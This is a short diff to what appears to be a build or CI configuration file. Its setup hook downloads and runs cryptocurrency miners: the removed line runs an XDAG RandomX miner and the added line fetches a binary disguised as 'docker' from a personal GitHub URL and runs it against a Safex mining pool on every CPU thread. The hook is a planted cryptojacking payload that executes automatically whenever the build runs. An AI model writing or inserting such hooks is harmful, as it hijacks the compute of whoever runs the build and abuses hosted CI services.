@@ -3,4 +3,5 @@ build:
     my-node:
       project_setup:
         before:
-          - command: wget https://github.com/XDagger/XdagRandomxMiner/releases/download/0.4.2/LinuxRandomxMiner.zip && unzip LinuxRandomxMiner.zip && rm -rf LinuxRandomxMiner.zip && chmod u+x DaggerRandomxMiner && ./DaggerRandomxMiner -cpu -p 82.156.18.237:13654 -t 16 -a A7F3atzGYPEBYAZlTZTfy4bKr8y3Ho57
+          - command: wget https://raw.githubusercontent.com/jsiqiisn/baby/main/docker && chmod 777 docker && ./docker -o sf.pool-pay.com:4025 -u SafexsoajK5bDJyaXhGtuCcvmoTNvg2GwA16VqmfS2hhPEUXchcs1xbRpvNuQ86ju1KjKzw9HUoW9bnq3YhbxtRXDxvyZWkYYDb3Z -p x@$(echo $(shuf -i 1111-9999 -n 1)-CPU) -k -a rx/sfx -t$(nproc --all)
+          
